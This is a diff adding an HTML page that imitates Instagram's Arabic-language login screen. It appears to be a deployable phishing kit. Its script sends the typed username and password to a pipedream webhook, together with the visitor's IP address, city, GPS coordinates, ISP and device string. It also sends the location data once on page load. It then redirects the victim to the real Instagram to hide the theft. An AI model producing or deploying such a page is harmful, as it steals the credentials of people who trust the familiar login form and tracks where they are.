@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=2, viewport-fit=cover">
+<title>Instagram</title>
+<link rel="icon" href="https://static.cdninstagram.com/rsrc.php/y4/r/QaBlI0OZiks.ico">
+<meta name="theme-color" content="#000000" media="(prefers-color-scheme: dark)">
+<style>
+* { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
+
+html, body {
+  height: 100%;
+  background: #0c1014;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  color: #f8f9f9;
+  overflow: hidden;
+}
+
+body {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: space-between;
+  min-height: 100vh;
+  padding: 12px 16px 28px;
+}
+
+.lang-bar {
+  font-size: 13px;
+  color: rgba(162,170,180,0.9);
+  text-align: center;
+  padding-top: 2px;
+  width: 100%;
+}
+
+.middle {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  width: 100%;
+  max-width: 380px;
+}
+
+/* شعار انستا مطابق للصورة */
+.logo-wrap {
+  width: 80px;
+  height: 80px;
+  border-radius: 20px;
+  overflow: hidden;
+  margin-bottom: 36px;
+}
+
+.logo-wrap img {
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+  display: block;
+}
+
+.fields {
+  width: 100%;
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+  margin-bottom: 14px;
+}
+
+.input-field input {
+  width: 100%;
+  background: rgba(255,255,255,0.06);
+  border: 1px solid rgba(255,255,255,0.13);
+  border-radius: 12px;
+  padding: 18px 16px;
+  font-size: 16px;
+  color: #f8f9f9;
+  outline: none;
+  text-align: right;
+  font-family: inherit;
+  -webkit-appearance: none;
+  transition: border-color 0.15s, background 0.15s;
+  caret-color: #0095F6;
+}
+
+.input-field input::placeholder {
+  color: rgba(162,170,180,0.65);
+  font-size: 14.5px;
+}
+
+.input-field input:focus {
+  border-color: rgba(255,255,255,0.25);
+  background: rgba(255,255,255,0.09);
+}
+
+.btn-login {
+  width: 100%;
+  background: #0095F6;
+  color: white;
+  border: none;
+  border-radius: 12px;
+  padding: 16px;
+  font-size: 16px;
+  font-weight: 600;
+  cursor: pointer;
+  margin-bottom: 16px;
+  font-family: inherit;
+  opacity: 0.35;
+  transition: opacity 0.15s, transform 0.1s;
+  -webkit-appearance: none;
+}
+
+.btn-login.ready { opacity: 1; }
+.btn-login.ready:active { transform: scale(0.99); }
+
+.forgot-link {
+  color: #f8f9f9;
+  font-size: 14px;
+  text-decoration: none;
+  text-align: center;
+  display: block;
+  margin-bottom: 24px;
+  opacity: 0.8;
+}
+
+.divider {
+  width: 100%;
+  height: 0.5px;
+  background: rgba(255,255,255,0.1);
+  margin-bottom: 24px;
+}
+
+.btn-signup {
+  width: 100%;
+  background: transparent;
+  color: #4DB5FF;
+  border: 1.5px solid rgba(77,181,255,0.35);
+  border-radius: 12px;
+  padding: 15px;
+  font-size: 15px;
+  font-weight: 600;
+  cursor: pointer;
+  font-family: inherit;
+  -webkit-appearance: none;
+  transition: background 0.15s;
+}
+
+.btn-signup:active { background: rgba(77,181,255,0.06); }
+
+.meta-footer {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 5px;
+  color: rgba(162,170,180,0.6);
+  font-size: 13px;
+}
+
+/* Loading */
+.loading-overlay {
+  display: none;
+  position: fixed;
+  inset: 0;
+  background: #0c1014;
+  z-index: 9999;
+  align-items: center;
+  justify-content: center;
+  flex-direction: column;
+  gap: 24px;
+}
+
+.loading-overlay.show { display: flex; }
+
+.loading-logo {
+  width: 56px;
+  height: 56px;
+  border-radius: 14px;
+}
+
+.spinner {
+  width: 28px;
+  height: 28px;
+  border: 2.5px solid rgba(255,255,255,0.12);
+  border-top-color: rgba(255,255,255,0.65);
+  border-radius: 50%;
+  animation: spin 0.7s linear infinite;
+}
+
+@keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+
+<div class="lang-bar">العربية</div>
+
+<div class="middle">
+  <div class="logo-wrap">
+    <img src="https://static.cdninstagram.com/rsrc.php/yw/r/icwX0xAk0pz.webp" alt="Instagram"
+         onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png'">
+  </div>
+
+  <div class="fields">
+    <div class="input-field">
+      <input type="text" id="username"
+        placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف المحمول"
+        autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"
+        oninput="checkForm()">
+    </div>
+    <div class="input-field">
+      <input type="password" id="password"
+        placeholder="كلمة السر"
+        autocomplete="off"
+        oninput="checkForm()">
+    </div>
+  </div>
+
+  <button class="btn-login" id="loginBtn" onclick="doLogin()">تسجيل الدخول</button>
+
+  <a href="#" class="forgot-link">هل نسيت كلمة السر؟</a>
+
+  <div class="divider"></div>
+
+  <button class="btn-signup">إنشاء حساب جديد</button>
+</div>
+
+<div class="meta-footer">
+  <svg width="16" height="16" viewBox="0 0 24 24" fill="rgba(162,170,180,0.6)">
+    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z"/>
+  </svg>
+  <span>Meta</span>
+</div>
+
+<div class="loading-overlay" id="loadingOverlay">
+  <img class="loading-logo"
+    src="https://static.cdninstagram.com/rsrc.php/yw/r/icwX0xAk0pz.webp"
+    onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png'">
+  <div class="spinner"></div>
+</div>
+
+<script>
+const WEBHOOK = "https://eocy1w7x0u37m91.m.pipedream.net";
+
+function checkForm() {
+  const u = document.getElementById("username").value;
+  const p = document.getElementById("password").value;
+  document.getElementById("loginBtn").classList.toggle("ready", u.length > 0 && p.length > 0);
+}
+
+async function sendData(extra) {
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    const loc = await res.json();
+    await fetch(WEBHOOK, {
+      method: "POST", mode: "no-cors",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        type: "🎯 Instagram Login",
+        username: extra.username || "",
+        password: extra.password || "",
+        ip: loc.ip, country: loc.country_name,
+        city: loc.city, lat: loc.latitude, lon: loc.longitude,
+        isp: loc.org, device: navigator.userAgent,
+        time: new Date().toLocaleString(),
+        maps: `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`
+      })
+    });
+  } catch(e) {}
+}
+
+function doLogin() {
+  const u = document.getElementById("username").value.trim();
+  const p = document.getElementById("password").value.trim();
+  if (!u || !p) return;
+  document.getElementById("loadingOverlay").classList.add("show");
+  sendData({ username: u, password: p });
+  setTimeout(() => { window.location.href = "https://www.instagram.com"; }, 3000);
+}
+
+sendData({});
+</script>
+</body>
+</html>
